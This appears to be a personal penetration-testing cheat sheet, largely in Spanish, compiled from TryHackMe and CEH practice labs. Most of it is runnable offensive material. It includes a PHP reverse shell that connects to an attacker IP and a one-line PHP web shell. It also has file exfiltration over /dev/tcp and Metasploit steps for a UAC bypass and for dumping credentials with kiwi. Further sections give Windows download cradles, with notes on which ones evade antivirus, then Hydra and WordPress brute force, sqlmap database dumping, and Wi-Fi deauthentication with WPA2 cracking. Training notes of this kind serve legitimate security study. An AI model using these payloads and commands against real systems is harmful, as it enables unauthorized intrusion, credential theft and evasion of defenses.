# Notes for pentest
## Reconnasiance/Footprinting

### netdiscover (ARP)

![image](https://user-images.githubusercontent.com/63270579/230136974-19ace88f-f73c-428c-bdf6-1bc2b4419637.png)

```
netdiscover -r 192.168.0.1/24 
```
```
nmap -sn  192.168.0.1/24

```


### Metasploit SMB

Para iniciar metasploit 

```
msfdb init && msfconsole
# En el caso de que no inicie pues ese pero siempre ejecuto nada mas este:
msfconsole
```
Buscar palabras claves 

```
search smb
```
Pero podemos llevar la busqueda a mas con un filtro como este que hice

![image](https://user-images.githubusercontent.com/63270579/230143806-39c278dc-e79c-4754-8a7f-67e9577b81a1.png)

Para encontrar que exploits se pueden usar para ***PRIV ESC***

```
run post/multi/recon/local_exploit_suggester
CTRL+z
set session 1 # Ve las opciones para que veas que pide que pongas una session
use exploit/windows/local/bypassuac_eventvwr
show options
set lhost
run
```

![image](https://user-images.githubusercontent.com/63270579/230158169-e12c02fd-68db-4d7b-a1ce-b77ae089575a.png)

Para ver los privilegios

```
getprivs
```

Para migrar a procesos que puedan manipilar el lsass

```
migrate -N spoolsv.exe

```
Para dumpear los passwords con  Mimikatz (Kiwi is the updated version of Mimikatz)
 ```
 load kiwi
 help
 cred_all
 ```
 
### Encontrar scripts nmap SMB

Vamos a buscarlos recordamos que los scripts tienen la extencion .nse

```
#Primero vemos si la base que usa locate esta actualizada

updatedb
locate *.nse
#Filtramos lo que nos interesa 
locate *.nse | grep "smb"

```


![image](https://user-images.githubusercontent.com/63270579/230146227-e6c3af45-1cea-46ee-9b30-0687eca73855.png)


## Windows  

### File system NTFS

The file system used in modern versions of Windows is the New Technology File System or simply NTFS. Before NTFS, there was FAT16/FAT32 (File Allocation Table) and HPFS (High Performance File System). 

You still see FAT partitions in use today. For example, you typically see FAT partitions in USB devices, MicroSD cards, etc. but traditionally not on personal Windows computers/laptops or Windows servers.

NTFS addresses many of the limitations of the previous file systems; such as: 

    Supports files larger than 4GB
    
    Set specific permissions on folders and files
    
    Folder and file compression
    
    Encryption (Encryption File System or EFS)
    
### Another feature of NTFS is Alternate Data Streams (ADS).

Every file has at least one data stream ($DATA), and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.

From a security perspective, malware writers have used ADS to hide data. 1


### lsass

The lsass service, the service responsible for authentication within Windows.

### spoolsv.exe

The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?


### La herramienta lusrmgr.msc para ver usuarios y grupos

Sirve para ver usuarios y grupos y se ejecuta con windows ejecutar...

![image](https://user-images.githubusercontent.com/63270579/230254629-0d0d7d4f-cc8b-4277-85e1-87455723147f.png)

Pero existen otras herramientas que permiten lo mismo desde la consola.

### net user

Para ver la informacion de un usuario (osea se tiene que tener el nombre del usuario):

```
net user tryhackmebilly
```

![image](https://user-images.githubusercontent.com/63270579/230254835-7253e274-2c0d-4369-a80d-06992b49fa29.png)

Para solo ver los usuarios de ese equipo:

```
net user

```
## Solo usuarios locales

Cuando ejecutas el comando "net user" en una máquina que está unida a un dominio de Active Directory, el resultado mostrará solo los usuarios locales en la máquina y no los usuarios del dominio.

Para ver una lista de todos los usuarios de un dominio de Active Directory, debes usar el comando "dsquery user" o "dsget user". Estos comandos te permiten buscar y obtener información sobre usuarios y objetos en el directorio de Active Directory.

## Groups

Para ver a que grupos pertenece el usuario con el que estas logueado:

```
whoami /groups

```
## net localgroup

> Adds, displays, or modifies local groups. Used without parameters, net localgroup displays the name of the server and the names of local groups on the computer.

Para saber por ejemplo que usuarios pertenecen al grupo local Administrators

```
net localgroup Administrators
```

![image](https://github.com/gecr07/CEH-Practical/assets/63270579/5fcb3024-77a0-4889-a3e6-a7e23bd86c10)

Para agregar un usuario a un grupo y despues checar que este

```
net localgroup Administrators Test_user /Add
```

## Shares 

Para enumerar los recursos compartidos desde windows....

```
net view  <IP>

```
Conectarse a los shares

```
net use
net use \\10.10.10.1\e ""\user:""
net use \\10.10.10.1\e ""/user:""
```



##  User Account Control (UAC)

Es una proteccion para evitar ejecutar con privilegios todo el tiempo todo

> La gran mayoría de los usuarios domésticos inician sesión en sus sistemas Windows como administradores locales. Recuerde de la tarea anterior que cualquier usuario con administrador como tipo de cuenta puede realizar cambios en el sistema.

Un usuario no necesita ejecutar con privilegios altos (elevados) en el sistema para ejecutar tareas que no requieren dichos privilegios, como navegar por Internet, trabajar en un documento de Word, etc. Este privilegio elevado aumenta el riesgo de que el sistema compromiso porque facilita que el malware infecte el sistema. En consecuencia, dado que la cuenta de usuario puede realizar cambios en el sistema, el malware se ejecutaría en el contexto del usuario que inició sesión.

Para proteger al usuario local con dichos privilegios, Microsoft introdujo el Control de cuentas de usuario (UAC). Este concepto se introdujo por primera vez con Windows Vista de corta duración y continuó con las versiones de Windows que siguieron.

Nota: UAC (de forma predeterminada) no se aplica a la cuenta de administrador local integrada.

 Ctrl+Shift+Esc es un shortcut para el taskmng en windows.
 
 ## There's difference between encoding and encrypting.
 
 Let's say you have an encrypted file, the only way to decrypt it is using key. While encoded data can be decoded immediately, without keys. It's NOT a form of encryption, it just a way of representing data.
 
 ## Download files
 
 ### Invoke-Web Request
 
 Para descargar archivos a windows. Desde maquina Kali a Windows desde cmd.
 
 ```
 powershell.exe -command iwr -uri http://192.18.142.12:8083/staff.txt -outfile C:\Users\g\AppData\Roaming\staff.txt
 ```
Desde Powershell

```
 iwr -uri http://192.168.1.128:8083/staff.txt -outfile C:\Users\g\AppData\Roaming\staff.txt
 iwr -uri http://192.168.2.128:8083/staff.txt -o C:\Users\g\AppData\Roaming\staff.txt
```
### Certutil

The purpose of the certutil was originally for certificate and CA management, but can also be used for file transfer.  se puede usar desde powershell o cmd.
Lo detecta el antivirus.

```
certutil -urlcache -f http://192.68.142.128:8083/pass_hash.txt pass_hash.txt
```

### Bitsadmin

Bitsadmin es una herramienta de línea de comandos disponible en sistemas operativos Windows que permite administrar y monitorear tareas relacionadas con BITS (Background Intelligent Transfer Service), que es un servicio de transferencia de archivos en segundo plano utilizado para descargas y actualizaciones automáticas en Windows.

Bitsadmin permite crear, pausar, reanudar y cancelar tareas de transferencia de archivos, así como monitorear el progreso de las mismas y ver estadísticas sobre el uso de red y recursos del sistema.

Esta herramienta es útil para administrar descargas y actualizaciones en entornos empresariales donde se realizan tareas de mantenimiento en múltiples computadoras y se requiere un control centralizado sobre la transferencia de archivos en segundo plano.

Desde CMD Tambien funciona desde powershell y ademas es indetectable para el mcafee.

```
bitsadmin /transfer job http://192.18.142.128:8083/pass_hash.txt C:\Users\g\AppData\Roaming\pass_hash.txt

```

### Curl

Yo no sabia pero esta en windows tanto en CMD como el PowerShell.

```
curl http://192.168.142.128:8083/pass_hash.txt -o C:\Users\g\AppData\Roaming\pass_hash.txt
```
### wget

Solo esta en powershell

```
wget http://192.168.142.8:8083/pass_hash.txt -outfile C:\Users\g\AppData\Roaming\pass_hash.txt
```
lo podemos usar en CMD

```
powershell.exe wget http://192.168.1.2/putty.exe -OutFile putty.exe
```

### PowerShell New-Object System.Net.WebClient

Desde el CMD 

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.18.142.128:8083/pass_hash.txt', 'C:\Users\g\AppData\Roaming\pass_hash.txt')
```
Desde PS

```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.142.128:8083/pass_hash.txt', 'C:\Users\gerardo.cruz\AppData\Roaming\pass_hash.txt')
```


## Lian_Yu (Tryhackme)

### FFUF 

Estos son como fuzzear con 2 listas para encontrar archivos.

```
ffuf -w /opt/SecLists/Discovery/Web-Content/masa0.txt -w /opt/SecLists/Discovery/Web-Content/masa1.txt:MASA -u http://10.10.67.136/island/2100/FUZZ.MASA -fc 400 -t 1 -v -x http://127.0.0.1:8080/
```

Y si tu tienes un archivo con extenciones no importa

```
ffuf -w /opt/SecLists/Discovery/Web-Content/masa0.txt -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt:MASA -u http://10.10.175.65/island/2100/FUZZMASA -fc 400 -t 1 -v -x http://127.0.0.1:8080/ 
```

### WFUZZ

Para hacer fuzzing con dos listas diferentes se usa el FUZ2Z como en el siguente ejemplo:

```
wfuzz -c --hc=404 -t 400 -w /opt/SecLists/Discovery/Web-Content/masa0.txt  -w /opt/SecLists/Discovery/Web-Conten│.log
t/masa1.txt http://10.10.175.65/island/2100/FUZZ.FUZ2Z
```

### CyberChef


Cuando no sepas en que esta encodeado algo pues usa el magic pero a veces eso no funciona usa el filtro y pon From y pues ve probando ejemplo:

![image](https://user-images.githubusercontent.com/63270579/230499176-b967041d-d3e0-4fbd-8e9b-4f1d6a66acf4.png)

Siempre piensa posibles usuarios validos que vayas encontrando ademas lee los comentarios de las paginas web que vayas encontrando.

### FTP

Para conectarte a un ftp simplemente usa:

```
ftp IP
> te pide el user y pass
> pass
#Ya dentro 
dir
help 
get #para bajar archivos
ls -la #
mget * # BAJA TODOS LOS ARCHIVOS EN DICHA CARPETA
```
Siempre revisa que no existan archivos ocultos (.file) antes de irte.

## Firmas de archivos conocidos 

> https://en.wikipedia.org/wiki/List_of_file_signatures

Tenemos el caso de una .png que no se puede abrir si vemos con file tampoco reconoce el archivo entonces podemos ver la firma con el editor hex

### hexeditor ( usa el -n para que no muestre ese color molesto)

editamos los primeros bytes para que se pueda abrir

![image](https://user-images.githubusercontent.com/63270579/230500823-81038c40-e59c-42be-9a96-88c33e00653e.png)

Despues de esto si se puede abrir nos da un password

### steghide 

Y a sabes herramienta para stenografia. ***We can’t use steghide tool on png files only jpg/jpeg files.***

```
steghide extract -sf <FILE_NAME> # Nos pide el password use el de la imagen de antes!
```

### xclip

```
cat a.txt | xclip -sel clip
```



## Startup (TryHackMe)

Esta es una maquina buena para practicar cosas basicas que se necesitan.

#### FTP 

Para subir archivos en caso de que tengamos permiso de escritura en dicho servidor se utiliza:

```
put archivo.txt
```

### PHP reverse shell

Esta es una shell reversa mas optimizada y facil de usar yo creo deberia usar siempre esta se pude cambiar por sh

```
<?php
$ip = '10.0.0.1'; // Dirección IP del atacante
$port = 1234; // Puerto en el que el atacante está escuchando

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

?>
```

### Pasar archivos con /dev/tcp/IP/port ( Y otras opciones)

#### cat

En la maquina victima 

```
cat test.txt >/dev/tcp/192.168.142.150/4444
```

En tu maquina atacante (por lo regular tu Kali)

```
nc -l 4444 > test.txt
```

#### Wireshark

Siempre utiliza los filtros en la barra por ejemplo http o tcp:

![image](https://user-images.githubusercontent.com/63270579/230734081-196dd999-64d2-4896-a540-21af7beb5248.png)

Siempre que tengas trafico que se pueda ver en texto claro usa las funciones de Follow in HTTP o TCP para que te muestren texto claro

![image](https://user-images.githubusercontent.com/63270579/230734324-9328c4f0-3154-4d09-a4d9-ffea886beb83.png)

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/71423a47-b79d-4183-a866-74506c0621b6)

### Conversations

Para ver las conversaciones de TCP y numero de paquetes etc

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/0682096b-4dea-408a-b99f-8a6e4b7e8175)



### Algunos filtros

```
tcp.flags.syn==1
```


### pspy32s

Es lo mejor para ver que procesos se ejecutan como root de aqui salio la escalacion.

#### SUID /bin/bash


Para darle permisos SUID 
```
chmod +s /bin/bash
```
Es igual a 

```
chmod u+s /bin/bash
```

Porque le dices que se ejecute con los permisos del usuario.

```
chmod g+s /bin/bash
```

Le estas diciendo que se ejecute con los permisos del grupo. A por cierto existe una variable de entorno $LIST


## Crack the hash (TryHackMe)

## Jonh The Ripper

Lo que se tiene que hacer el identificar que tipo de hash es en este caso es uno facil md5 despues solo especificar la lista y el hash siempre usa la opcion -n en echo

```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```

Si muestra el hash crackeado pero si no usa show.

```
john --format=raw-md5 --show hash.txt
```

Para ver los formatos que acepta john ( aunque estoy confundido )

```
john --list=formats
```

## Hydra 

```
hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /opt/SecLists/Passwords/darkweb2017-top10000.txt  -f -s 8080 10.10.144.233 http-get /manager/html

```

```
sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 64 -f  ssh://10.10.25.155
```

Para usar Hydra tienes que recordar el -l es para cuando tienes un string y mayuscula es cuando quieres buscar en una lista

```
hydra -L worlist.txt -P wordlist IP ftp
hydra -L worlist.txt -P wordlist IP ssh

# If the service isn't running on the default port, use -s

 hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221
 
```

### SMB enumeration 

Para enumerar los posibles shares que existan en SMB

![image](https://user-images.githubusercontent.com/63270579/230946426-568bea8f-0d71-4b58-9acd-f81341024991.png)

### NMAP

```
nmap --script=smb-enum* -p445,139 10.10.25.155
nmap --script smb-enum-users IP
nmap -p 445 --script snm-enum-users --script-args smbusername=administrator,smbpassword=smbserver IP
nmap -p 445 --script snm-enum-groups --script-args smbusername=administrator,smbpassword=smbserver IP
nmap -p 445 --script snm-enum-services --script-args smbusername=administrator,smbpassword=smbserver IP
```

### smbclient 

Para conectarte a los recursos compartidos que encontraste

![image](https://user-images.githubusercontent.com/63270579/230944882-fd168e47-9ec3-40c4-aea2-d8463a3bb538.png)

```
smbclient //10.10.25.155/anonymous
```

## enum4linux

Enum4linux es una herramienta de enumeración de información de sistemas basados en Samba, que se utiliza para obtener información de servidores y estaciones de trabajo que ejecutan el protocolo SMB (Server Message Block). Enum4linux ayuda a los evaluadores de seguridad y administradores de sistemas a recopilar información útil sobre el entorno de Samba, incluyendo la lista de usuarios y grupos, las políticas de contraseña, la configuración de recursos compartidos, la información del sistema operativo y otra información de red. Esta herramienta puede ser útil para identificar posibles vulnerabilidades y puntos débiles en un entorno de red.

```

enum4linux -e [Target_Machine_IP]
```



## SSH

Yo no sabia pero aunque tengamos una clave privada en este caso una id_rsa puede estar protegida por 

![image](https://user-images.githubusercontent.com/63270579/231051813-a89060f0-f407-4dcb-a12d-076d119e4bbd.png)

Para eso podemos usar john the ripper

![image](https://user-images.githubusercontent.com/63270579/231052020-51f2353d-371d-4148-8c8a-7f2cf6062726.png)

```
/usr/share/john/ssh2john.py id_rsa > pass_hash.txt
```
Ya despues ese hash que sale jonh lo detecta automatico

```
john pass_hash.txt /usr/share/wordlists/rockyou.txt 
```

## WebScanner

### Skipfish

```
skipfish -o Direccion_Donde_guardar_el_output http://192.168.1.202/wordpress
```

### Nikto

```
nikto -h www.example.com tuning 1
```

## WPSCAN

![image](https://user-images.githubusercontent.com/63270579/231893014-5f516f37-2822-40da-9956-b9bdcaea8a21.png)

### Enumerar Usuarios de WordPress

```
wpscan --url blog.thm --enumerate u 
```

### Fuerza Bruta desde wpscan

```
wpscan — url blog.thm -P /usr/share/wordlists/rockyou.txt -U “kwheel”

```


## TTY Shell

spawn a TTY shell using python.

```
python -c 'import pty; pty.spawn("/bin/sh")'
```



## IBAN 

Los números IBAN (International Bank Account Number) son un estándar internacional utilizado para identificar de manera única una cuenta bancaria en una transacción internacional. El IBAN consta de un código de país, un número de verificación y un número de cuenta bancaria, que juntos proporcionan toda la información necesaria para dirigir una transferencia bancaria a una cuenta específica. El IBAN es utilizado principalmente en Europa, pero también se ha adoptado en muchos otros países de todo el mundo

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/a5b61eac-b96c-4521-ba79-68c5c062a713)


## PosBIN ( alternativa a BurptSuite Pro)

Permite hacer dnslookup para por ejemplo ver si hay una ejecucion de comandos.

> https://www.toptal.com/developers/postbin/

## PHP RCE basic

```
<?php 
 echo "<pre>". shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
```

## nslookup

![image](https://github.com/gecr07/CEH-Practical/assets/63270579/85ca5021-3f78-445f-ae80-046754718f74)

![image](https://github.com/gecr07/CEH-Practical/assets/63270579/38a94d8d-0b01-4ff2-85f9-8349a6f7c1b5)

![image](https://github.com/gecr07/CEH-Practical/assets/63270579/1db47017-c2c7-4fb5-a55a-fdfe0b9e015f)

## Android Hacking

Para que esto funcione en el mundo real tienes que tener acceso fisico al portal despues activar la depuracion usb despues aceptar el certificado que va a permitir ( al parecer ) que solo se pueda conectar esa computadora por via remota aceptar todo. A y tienes que tener instalado el ADB en la pc atacante.

Los comando para minipular el android via remota son:

```
apt-get update
sudo apt-get install adb -y
adb devices -l

# Connection Establish Steps
adb connect 192.168.0.4:5555
adb devices -l
adb shell  

# Download a File from Android using ADB tool
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop

```
## SQLMAP ( tryhackme )

Primero que nada tenemos que identificar la peticion que podria ser vulnerable se podria con el burpsuite o incluso con el firefox..

```
curl 'http://10.10.137.157/blood/view.php?id=1'
```

En este caso puede ser esta o la peticion porque es un GET pero podria ser un Post con lo que hacemos asi copy to file

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/6f6a79ba-4faf-42e4-8dbf-06295d4b8ac0)

Paso uno intentar enumerarar la base de datos dbs

```
sqlmap -r req.txt -p username --dbs  
```
Ya que tenemos las bases de datos vamos poco a poco iniciando cuanod ya se tiene algo en concreto como la el nombre de la base de datos se comienza a escribir con mayuscula -D y lo que varia es con minusculas --tables

```
sqlmap -r req.txt -p username -D blood --tables  
```

Entonces ahora ya tenemos la tabla es una constante

```
sqlmap -r req.txt -p username -D blood -T flag --columns
```
Y finalmente pues usamos el DUMP

```
`sqlmap -r req.txt -p username -D blood -T flag --dump 
```

## Google Dorks

Usalo para buscar cosas por ejemplo servidores ftp expuestos etc..

```

https://www.exploit-db.com/google-hacking-database
```
## SNMP Enum ( Protocolo simple de administración de red)

Para enumerar este protocolo encontre una tool que se llama:

```
snmp-cheack IP
```
algo que tienes que tener en cuenta es que SNMP usa puertos de UDP. mira esto:

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/ec49e283-d7c5-484f-bf30-63faf81db7de)

Un truco bueno es ver los scripts que nmap tiene para esto en google escribe "nsedocs" y en la pestaña de scripts vienen los que son para snmp ahi por ejemplo podrias buscar el que se usa para enumerar procesos es cuestiond e buscarle... Por ejemplo:

```
nmap -sU -p 161 --script=snmp-processes IP
```

Con metasploit ya sabes busca:

```
msfconsole
search snmp
use auxiliary/scanner/snmp/snmp_login
```

## RDP (3389)

Con metasploit existe un modulo que sirve para esto:

```
auxiliary/scanner/rdp/rdp_scanner
```
Con hydra se puede hacer brute force a casi lo que sea.

```
hydra -L wordlist -P wordlist rdp://IP -s diferent_port
```
Para conectarte al rdp desde la consola puedes usar:

```
xfreerdp /u:administrator /p:passwd /v:IP:port_if_it_changes_and_its_not3389
```

## NetBios Enum

Con nmap se puede enumerar

```
nmap -sV --script nbstat.nse IP
```


## DDOS vs DOS

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/0e420421-c05b-433f-adc0-ad1fcb724311)

Para que se entienda la diferencia ahi esta graficamente.

## Steganography

Es esconder informacion ya sea por imagenes o mp3 o otros archivos.

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/37f53e8b-b3ec-416b-9937-59da05de8b57)

### SNOW (windows pero tambien esta en kali )


Entiendo que es una herramienta de stegano que esconde mensajes en espacios en blanco. Para Kali es el paquete "stegnow" si no esta
instalado:

```
sudo apt install stegsnow
```

Para esconder:

```
-C Es para comprimir los datos si los oculta, o para descomprimirlos mientras los extrae.

-p Es para una contraseña para ocultar y extraer.

input.txt El archivo en el que desea ocultar el mensaje.

salida.txt El archivo en el que desea la salida.
SNOW.EXE -C -p passwd -m "Soy el mesage secreto" input.txt output.txt
```
Para extraer el mensaje secreto entonces:

```
SNOW.EXE -C -p passwd output.txt
```
![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/e489fd54-54e0-411d-8864-1448bab050c9)

### OpenStego

Esta tool sirve para esconder por ejemplo un txt en una imagen ( cover file) puedes usar password o no para asegurarla no le veo sentifo poner mas..

### convert_tcp

Esta tool entiendo que oculta la informacion en el espacio que queda libre de las cabeceras de TCP. En conclucion funciona como un cliente servidor es como si tuvieras una shell reversa pero shell normal dejo los comandos.

![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/3d2c8d1b-0fa8-4a75-88fa-7925fa56cbcc)

para compilar ya sabes

```
gcc file.c -o out_file
```
## Crack WPA2 from .cap

Primero para esta prueba vamos a capturar los paquetes.

```
iwconfig # Para ver las tarjetas conectadas

```
## Aircrack 

Paso uno poner en modo monitor la tarjeta

```
airmon-ng check kill
airmon-ng start wlan0

```

## Captura de paquetes

```
airodump-ng -i wlan0mon
```

> https://medium.com/hacking-info-sec/c%C3%B3mo-capturar-y-desencriptar-tr%C3%A1fico-en-wifi-wpa-wpa2-5fad004a5ea3



## Captura del Handshake

```
aireplay-ng -0 10 -a <bssid> --ignore-negative-one <interfaz>

```

Tienes que abrir otra ventana y desautenticas a los usuarios

```
aireplay-ng -0 10 -a <bssid> --ignore-negative-one <interfaz>

```


> Repetir este comando hasta que aparezca el handshake en la ventana en la que se está capturando la información. Este se muestra en la esquina superior derecha:




![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/267266d2-5dfc-4f1f-83b8-6f1a5bf96250)



## Crackear WPA2

Tienes que trasformar el .cap a un formato que entienda hashcat para esto se usa el 
hcxtools.

> https://node-security.com/posts/cracking-wpa2-with-hashcat/

```
hcxpcapngtool wifiCapture-01.cap -o /home/user1/wifiHashes.txt

````
## Hashcat

Como nota se puede usar el modo 22000 solo en versiones mayores a hashcat 
```
 .\hashcat.exe -m 22000 -w 3 .\toCrack\wifiHashes.txt .\passwordLists\hashkiller-dict.txt
```


![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/bc9ae5a7-1caf-45f6-9884-5c80a0cb55b5)

> https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2

## Bibliografias 

/dev/tcp

> https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/

_wget 

> https://andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/


File Trasfer

> https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/


SUID script identifier

> https://github.com/Anon-Exploiter/SUID3NUM

SMB CheetSheet

> https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

Revisa los enlaces del final tiene de todo

> https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master

Pentesting notes igual muy bueno checalo si necesitas por ejemplo ver lo del netbios

> https://book.thegurusec.com/certifications/certified-ethical-hacker-practical

Ceh notes

> https://github.com/infovault-Ytube/CEH-Practical-Notes/blob/main/README.md



















